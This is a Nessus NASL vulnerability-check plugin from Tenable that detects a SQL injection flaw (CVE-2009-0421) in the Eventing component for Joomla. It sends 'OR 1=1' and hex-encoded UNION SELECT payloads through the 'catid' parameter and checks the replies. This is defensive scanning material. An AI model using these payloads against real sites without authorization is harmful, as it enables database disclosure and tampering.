#
# (C) Tenable Network Security, Inc.
#

if ( NASL_LEVEL < 3000 ) exit(0);



include("compat.inc");

if (description)
{
  script_id(35435);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2009-0421");
  script_bugtraq_id(33296);
  script_xref(name:"milw0rm", value:"7793");
  script_xref(name:"OSVDB", value:"51376");

  script_name(english:"Eventing Component for Joomla! index.php catid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate SQL queries");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Eventing, a third-party event handling
component for Joomla. 

The version of Eventing installed on the remote host fails to sanitize
user-supplied input to the 'catid' parameter of the 'eventing.php'
script under 'components/com_eventing' before using it to construct
database queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated attacker may be able to exploit this issue to
manipulate database queries, leading to disclosure of sensitive
information or attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to list all events using a random category id.
  catid = unixtime();
  exploit = string(catid, " OR 1=1");
  url = string(
    dir, "/index.php?",
    "option=com_eventing&",
    "catid=", exploit
  );
  url = str_replace(find:" ", replace:"%20", string:url);

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (res == NULL) exit(0);

  # If it looks like Eventing...
  if ('com_eventing' >< res[2])
  {
    # If we see did not see any results...
    if ('onmouseout="return nd();"' >!< res[2])
    {
      # Try a different exploit that works even if there are no events,
      # although it does require an older version of MySQL.
      #
      # nb: this creates an entry for the current day with the name of the plugin.
      exploit = string(catid, " UNION SELECT 1,2,", hexify(str:SCRIPT_NAME), ",4,", hexify(str:'yesterday'), ",", hexify(str:'today'), ",7,8,9,10/*");
      url = string(
        dir, "/index.php?",
        "option=com_eventing&",
        "catid=", exploit
      );
      url = str_replace(find:" ", replace:"%20", string:url);

      res = http_send_recv3(method:"GET", item:url, port:port);
      if (res == NULL) exit(0);
    }

    # There's a problem if we see some events.
    if (
      '<td class="eventday">' >< res[2] &&
      'onmouseout="return nd();"' >< res[2]
    )
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to verify the vulnerability exists using the following\n",
          "URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
